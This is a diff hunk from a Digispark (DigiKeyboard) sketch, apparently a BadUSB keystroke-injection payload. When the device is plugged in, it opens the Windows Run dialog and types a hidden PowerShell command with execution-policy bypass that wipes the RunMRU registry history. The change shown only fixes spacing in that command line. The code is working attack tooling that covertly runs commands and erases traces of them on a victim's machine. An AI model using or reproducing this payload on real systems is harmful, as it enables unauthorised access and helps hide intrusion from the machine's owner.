@@ -30,7 +30,7 @@ void setup() {
 
   DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell -windowstyle hidden -Exec Bypass Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'-Name '*' -ErrorAction SilentlyContinue");
+  DigiKeyboard.print("powershell -windowstyle hidden -Exec Bypass Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue");
   DigiKeyboard.delay(300);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(300);
